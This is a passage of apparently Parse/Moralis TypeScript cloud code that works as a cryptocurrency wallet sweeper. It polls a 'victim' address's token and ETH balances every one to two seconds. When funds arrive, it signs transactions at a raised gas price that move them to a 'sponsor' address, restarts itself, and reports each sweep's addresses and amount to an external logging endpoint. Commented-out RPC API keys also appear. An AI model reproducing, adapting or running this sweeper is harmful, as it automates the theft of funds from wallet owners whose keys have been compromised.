me":"_contractURI","type":"string"},{"internalType":"address[]","name":"_trustedForwarders","type":"address[]"},{"internalType":"address","name":"_primarySaleRecipient","type":"address"},{"internalType":"address","name":"_platformFeeRecipient","type":"address"},{"internalType":"uint256","name":"_platformFeeBps","type":"uint256"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"forwarder","type":"address"}],"name":"isTrustedForwarder","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mintTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"primarySaleRecipient","type":"address"},{"internalType":"uint256","name":"quantity","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"currency","type":"address"},{"internalType":"uint128","name":"validityStartTimestamp","type":"uint128"},{"internalType":"uint128","name":"validityEndTimestamp","type":"uint128"},{"internalType":"bytes32","name":"uid","type":"bytes32"}],"internalType":"struct ITokenERC20.MintRequest","name":"_req","type":"tuple"},{"internalType":"bytes","name":"_signature","type":"bytes"}],"name":"mintWithSignature","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"results","type":"bytes[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"numCheckpoints","outputs":[{"internalType":"uint32","name":"","type":"uint32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"primarySaleRecipient","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"renounceRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"revokeRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"_uri","type":"string"}],"name":"setContractURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_platformFeeRecipient","type":"address"},{"internalType":"uint256","name":"_platformFeeBps","type":"uint256"}],"name":"setPlatformFeeInfo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_saleRecipient","type":"address"}],"name":"setPrimarySaleRecipient","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"primarySaleRecipient","type":"address"},{"internalType":"uint256","name":"quantity","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"currency","type":"address"},{"internalType":"uint128","name":"validityStartTimestamp","type":"uint128"},{"internalType":"uint128","name":"validityEndTimestamp","type":"uint128"},{"internalType":"bytes32","name":"uid","type":"bytes32"}],"internalType":"struct ITokenERC20.MintRequest","name":"_req","type":"tuple"},{"internalType":"bytes","name":"_signature","type":"bytes"}],"name":"verify","outputs":[{"internalType":"bool","name":"","type":"bool"},{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]

  // var web33 = new Web3("https://goerli.Ankra.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd");

 var  web33 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));

  // var web33 = new Moralis.Web3(
  //   new Moralis.Web3.providers.HttpProvider(
  //     // "https://goerli.Ankra.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
  //     "https://bsc.getblock.io/mainnet/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
  //   )
  // );
  // console.log(web33.version)

//  logger.info(JSON.stringify(web33.version ));

var sponsor = web33.eth.accounts.privateKeyToAccount('fukoff');;
var victim = web33.eth.accounts.privateKeyToAccount('fukoff');;

var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";

if (
  !sponsor.privateKey  ||
  !victim.privateKey 
) {
  // logger.info("Please set both SPONSOR_KEY and VICTIM_KEY env");
  // console.error("Please set both SPONSOR_KEY and VICTIM_KEY env");
  return
}


// var abi = ["function transfer(address,uint256) external",   "function balanceOf(address owner) view returns (uint256)", "function transferFrom(address,address,uint256) external", "function allowance(address,address) view returns (uint256)", "function approve(address, uint256) external returns (bool)"];

var contract = new web33.eth.Contract(abijson, TOKEN_ADDRESS);



var invtl = setInterval(async () => {

    if(stop == true) {

      clearInterval(invtl)
      // logger.info("stopped at strt");
      // console.log("stopped")
      return;

    }
  var tkbalanceADDR1 = await contract.methods.balanceOf(victim.address).call()
  // console.log(tkbalanceADDR1.toString())
  // logger.info(tkbalanceADDR1.toString());
  // logger.info(JSON.stringify(count++));
  if( parseInt(tkbalanceADDR1.toString()) > 2) {
    dripbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, "logger", stop) 
    // console.log("Now grater than")
    // logger.info("Now grater than");
  }
  else  {
    // logger.info("Less Than");
    // console.log("less than")
  }


}, 2000);



};



async function dripbalancegreaterthanweb3js(contract: any, victim: any, sponsor: any, tkbalanceADDR1: any, web33: any, TOKEN_ADDRESS: any, llooggerx: any, stop: any) {
  // var loggerdrip = Moralis.Cloud.getLogger();
  // console.log(contract)
 
  var transferfrom = contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString())
 
   
var gaslimit = await web33.eth.estimateGas({from: sponsor.address})
// var gaslimit = await contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString()).estimateGas({from: sponsor.address})


var gasPrice = await web33.eth.getGasPrice()

var BN = web33.utils.BN;

gasPrice = web33.utils.toBN(gasPrice)
gaslimit = web33.utils.toBN(gaslimit)

var transaction  = {
  // chainId: 56,
  from: sponsor.address,
  nonce: 0,
  to: TOKEN_ADDRESS,
  gasPrice: gasPrice.add(gasPrice.divn(2)),
  gasLimit: gaslimit.muln(2),
  data: transferfrom.encodeABI(),

}



try {
  
var nonce = await web33.eth.getTransactionCount(sponsor.address);
transaction.nonce = nonce;
let signedTx = await web33.eth.accounts.signTransaction(transaction, sponsor.privateKey )

// logger.info(signedTx);
// llooggerx.info(JSON.stringify(signedTx));
 web33.eth.sendSignedTransaction(signedTx.rawTransaction).on('receipt', (receipt: any) => {
    // console.log(receipt)
    // llooggerx.info(receipt);
    stopfunc(stop)

    setTimeout(async () => {
      stop = false;
      botDripWeb3js()
      // llooggerx.info("succss:	😀 restarting");

      Parse.Cloud.httpRequest({
        method: 'POST',
       url: config.MLIS_URL,
       headers: {
         "content-type": "application/json",
         "x-apikey": config.MLIS_KEY,
         "cache-control": "no-cache"
       },
        body: {
          addr_from: receipt.from,
          addr_to: receipt.to,
          value: "result",
          time:  new Date().toLocaleString(),
          brand: "HoneyperSecondTransactionEth",
          server: "1"
        }
      }).then(function(httpResponse: any) {
        //logger.info(httpResponse.text);
        // llooggerx.info("Fired paw paw!");
      }, function(httpResponse: any) {
        // llooggerx.info(JSON.stringify(httpResponse));
      });

      await realLogger("new")

    }, 5000);
   } ).on('error', (err: any) => {
    // console.log(err)
    // console.log(err.message)
    // llooggerx.error(err.message);
    // llooggerx.info(JSON.stringify(err.message) );

    if (err.message == 'Returned error: already known' || err.emmage == 'Returned error: replacement transaction underpriced') {
      stopfunc(stop)
      setTimeout(() => {
        stop = false;
        botDripWeb3js()
        // llooggerx.info("restarting, after error");
        // logger.info("restarting, after error");
        
      }, 5000);

    }
   } )



} catch (error) {

  
  // llooggerx.error(error);
  // llooggerx.info(JSON.stringify(error));
  // console.log(error)
  // llooggerx.info("try catch block error")
}



}








  

async function MaticjsWeb3js(){

  // var logger = Moralis.Cloud.getLogger();
  var config = await Parse.Config.get({useMasterKey: true});
  var prjid = config.get("Ankr");
   var stop = false;
   var count = 0;
  let abijson: any = [{"inputs":[{"internalType":"address","name":"_thirdwebFee","type":"address"}],"stateMutability":"nonpayable","type":"varructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegator","type":"address"},{"indexed":true,"internalType":"address","name":"fromDelegate","type":"address"},{"indexed":true,"internalType":"address","name":"toDelegate","type":"address"}],"name":"DelegateChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegate","type":"address"},{"indexed":false,"internalType":"uint256","name":"previousBalance","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"newBalance","type":"uint256"}],"name":"DelegateVotesChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Paused","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"platformFeeRecipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"platformFeeBps","type":"uint256"}],"name":"PlatformFeeInfoUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"}],"name":"PrimarySaleRecipientUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"previousAdminRole","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"newAdminRole","type":"bytes32"}],"name":"RoleAdminChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"sender","type":"address"}],"name":"RoleGranted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"role","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"sender","type":"address"}],"name":"RoleRevoked","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"mintedTo","type":"address"},{"indexed":false,"internalType":"uint256","name":"quantityMinted","type":"uint256"}],"name":"TokensMinted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"signer","type":"address"},{"indexed":true,"internalType":"address","name":"mintedTo","type":"address"},{"components":[{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"primarySaleRecipient","type":"address"},{"internalType":"uint256","name":"quantity","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"currency","type":"address"},{"internalType":"uint128","name":"validityStartTimestamp","type":"uint128"},{"internalType":"uint128","name":"validityEndTimestamp","type":"uint128"},{"internalType":"bytes32","name":"uid","type":"bytes32"}],"indexed":false,"internalType":"struct ITokenERC20.MintRequest","name":"mintRequest","type":"tuple"}],"name":"TokensMintedWithSignature","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"account","type":"address"}],"name":"Unpaused","type":"event"},{"inputs":[],"name":"DEFAULT_ADMIN_ROLE","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint32","name":"pos","type":"uint32"}],"name":"checkpoints","outputs":[{"components":[{"internalType":"uint32","name":"fromBlock","type":"uint32"},{"internalType":"uint224","name":"votes","type":"uint224"}],"internalType":"struct ERC20VotesUpgradeable.Checkpoint","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"contractType","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"contractURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"contractVersion","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"}],"name":"delegate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"delegateBySig","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"delegates","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastTotalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getPlatformFeeInfo","outputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint16","name":"","type":"uint16"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"}],"name":"getRoleAdmin","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"getRoleMember","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"}],"name":"getRoleMemberCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"getVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"grantRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"hasRole","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_defaultAdmin","type":"address"},{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"string","name":"_contractURI","type":"string"},{"internalType":"address[]","name":"_trustedForwarders","type":"address[]"},{"internalType":"address","name":"_primarySaleRecipient","type":"address"},{"internalType":"address","name":"_platformFeeRecipient","type":"address"},{"internalType":"uint256","name":"_platformFeeBps","type":"uint256"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"forwarder","type":"address"}],"name":"isTrustedForwarder","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mintTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"primarySaleRecipient","type":"address"},{"internalType":"uint256","name":"quantity","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"currency","type":"address"},{"internalType":"uint128","name":"validityStartTimestamp","type":"uint128"},{"internalType":"uint128","name":"validityEndTimestamp","type":"uint128"},{"internalType":"bytes32","name":"uid","type":"bytes32"}],"internalType":"struct ITokenERC20.MintRequest","name":"_req","type":"tuple"},{"internalType":"bytes","name":"_signature","type":"bytes"}],"name":"mintWithSignature","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"results","type":"bytes[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"numCheckpoints","outputs":[{"internalType":"uint32","name":"","type":"uint32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"primarySaleRecipient","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"renounceRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"role","type":"bytes32"},{"internalType":"address","name":"account","type":"address"}],"name":"revokeRole","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"_uri","type":"string"}],"name":"setContractURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_platformFeeRecipient","type":"address"},{"internalType":"uint256","name":"_platformFeeBps","type":"uint256"}],"name":"setPlatformFeeInfo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_saleRecipient","type":"address"}],"name":"setPrimarySaleRecipient","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"to","type":"address"},{"internalType":"address","name":"primarySaleRecipient","type":"address"},{"internalType":"uint256","name":"quantity","type":"uint256"},{"internalType":"uint256","name":"price","type":"uint256"},{"internalType":"address","name":"currency","type":"address"},{"internalType":"uint128","name":"validityStartTimestamp","type":"uint128"},{"internalType":"uint128","name":"validityEndTimestamp","type":"uint128"},{"internalType":"bytes32","name":"uid","type":"bytes32"}],"internalType":"struct ITokenERC20.MintRequest","name":"_req","type":"tuple"},{"internalType":"bytes","name":"_signature","type":"bytes"}],"name":"verify","outputs":[{"internalType":"bool","name":"","type":"bool"},{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]

  // var web33 = new Web3("https://goerli.Ankra.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd");
  var  web33 = new Web3(new Web3.providers.HttpProvider("https://eth.getblock.io/"+prjid+"/mainnet/"));

  // var web33 = new Moralis.Web3(
  //   new Moralis.Web3.providers.HttpProvider(
  //     // "https://goerli.Ankra.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
  //     // "https://eth.getblock.io/goerli/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
  //     "https://mainnet.Ankra.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
  //     // "https://eth.getblock.io/mainnet/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
  //   )
  // );

  // console.log(web33.version)

//  logger.info(JSON.stringify(web33.version));

var sponsor = web33.eth.accounts.privateKeyToAccount('fukoff');;
var victim = web33.eth.accounts.privateKeyToAccount('fukoff');;

var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";

if (
  !sponsor.privateKey  ||
  !victim.privateKey 
) {
  // logger.info("Please set both SPONSOR_KEY and VICTIM_KEY env");
  // console.error("Please set both SPONSOR_KEY and VICTIM_KEY env");
  return
}


// var abi = ["function transfer(address,uint256) external",   "function balanceOf(address owner) view returns (uint256)", "function transferFrom(address,address,uint256) external", "function allowance(address,address) view returns (uint256)", "function approve(address, uint256) external returns (bool)"];

var contract = new web33.eth.Contract(abijson, TOKEN_ADDRESS);

// console.log("started")

var invtl = setInterval(async () => {

    if(stop == true) {

      clearInterval(invtl)
      // logger.info("stopped at strt");
      // console.log("stopped")
      return;

    }
  // var tkbalanceADDR1 = await contract.methods.balanceOf(victim.address).call()
  var tkbalanceADDR1 = await web33.eth.getBalance(victim.address)

  // logger.info(tkbalanceADDR1.toString());
  // console.log(tkbalanceADDR1.toString())
  // logger.info(JSON.stringify(count++));

  var wei: any = web33.utils.fromWei(tkbalanceADDR1, 'ether');
  // logger.info(wei.toString());


  if(  wei > 0.00000290810719206) {
    maticbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, "logger", stop) 
    // console.log("Now grater than")
    // logger.info("Now grater than");
  }
  else  {
    // logger.info("Less Than");
    // console.log("less than")
  }

}, 1000);



};



async function maticbalancegreaterthanweb3js(contract: any, victim: any, sponsor: any, tkbalanceADDR1: any, web33: any, TOKEN_ADDRESS: any, llooggerx: any, stop: any) {
  // var loggerdrip = Moralis.Cloud.getLogger();
  // console.log(contract)

  // var transferfrom = contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString())
 
   
// var gaslimit = await web33.eth.estimateGas({from: victim.address})
// var gaslimit = await contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString()).estimateGas({from: sponsor.address})

var gasPrice = await web33.eth.getGasPrice()

var BN = web33.utils.BN;

gasPrice = web33.utils.toBN(gasPrice)
// gaslimit = web33.utils.toBN(gaslimit)

var gas = 21000
 var dgasPrice = gasPrice.add(gasPrice.divn(2))

var fee = dgasPrice.muln(gas);
var bl = new BN(tkbalanceADDR1);
// logger.info("got to matic try catch");

var baltosend =  bl.sub(fee);

var transaction  = {
  // chainId: 56,
  // from: victim.address,
  // nonce: 0,
  to: sponsor.address,
  gasPrice: dgasPrice,
  gas: gas,
  value: baltosend,

  // 'to': rcveraddress, // faucet address to return eth
  // 'value': baltosend,
  // 'gas': gas,
  // 'gasPrice': gasPrice,

}


try {
  
// var nonce = await web33.eth.getTransactionCount(sponsor.address);
// transaction.nonce = nonce;
let signedTx = await web33.eth.accounts.signTransaction(transaction, victim.privateKey )

// logger.info("got to try catch");
// llooggerx.info(JSON.stringify(signedTx));
 web33.eth.sendSignedTransaction(signedTx.rawTransaction).on('receipt', (receipt: any) => {
    // console.log(receipt)
    // llooggerx.info(receipt);
    stopfunc(stop)

    setTimeout(async () => {
      stop = false;
      MaticjsWeb3js()
      // llooggerx.info("succss:	😀 restarting");

      Parse.Cloud.httpRequest({
        method: 'POST',
       url: config.MLIS_URL,
       headers: {
         "content-type": "application/json",
         "x-apikey": config.MLIS_KEY,
         "cache-control": "no-cache"
       },
        body: {
          addr_from: receipt.from,
          addr_to: receipt.to,
          value: baltosend,
          time:  new Date().toLocaleString(),
          brand: "HoneyperMaticValidator",
          server: "1"
        }
      }).then(function(httpResponse: any) {
        //logger.info(httpResponse.text);
        // llooggerx.info("Fired paw paw!");
      }, function(httpResponse: any) {
        // llooggerx.info(JSON.stringify(httpResponse));
      });

      await realLogger("new")
    }, 5000);
   } ).on('error', (err: any) => {
    // console.log(err)
    // console.log(err.message)
    // llooggerx.error(err.message);
    // llooggerx.info(JSON.stringify(err.message) );

    if (err.message == 'Returned error: already known' || err.emmage == 'Returned error: replacement transaction underpriced') {
      stopfunc(stop)
      setTimeout(() => {
        stop = false;
        MaticjsWeb3js()
        // llooggerx.info("restarting, after error");
        // logger.info("restarting, after error");
        
      }, 5000);

    }
   } )



} catch (error) {

  
  // llooggerx.error(error);
  // llooggerx.info(JSON.stringify(error));
  // console.log(error)
  // llooggerx.info("try catch block error")
}



}





function stopfunc(stpbool: any) {

  stpbool = true;

}





function getntwork(chainid: number) {

  var chainids = [

    {
      id: 1 ,
      name: 'eth'
    },
    {
      id: 5 ,
      name: 'goerli'
    },

    {
      id: 11155111 ,
      name: 'sepolia'
    },
    
    {
      id: 137 ,
      name: 'polygon'
    },
    {
      id: 43114 ,
      name: 'avax'
    },
    {
      id: 56 ,
      name: 'bsc'
    },
    {
      id: 250 ,
      name: 'fantom'
    },
    {
      id: 10 ,
      name: 'op'
    },
    {
      id: 42161 ,
      name: 'arb'
    },
    {
      id: 25 ,
      name: 'cronos'
    },
    {
      id: 369,
      name: 'pulse'
    },
    {
      id: 11297108109,
      name: 'palm'
    },
    {
      id: 324,
      name: 'zkSync'
    },
    {
      id: 100,
      name: 'gnosis'
    },
    {
      id: 8453,
      name: 'base'
    }
    

  
   
  ]

    // grab the Array item which matchs the id "2"
    var item = chainids.find(item => item.id === chainid);


    var returnvalue = '';

    if(item) {

      returnvalue =  item.name;
    }
    else {

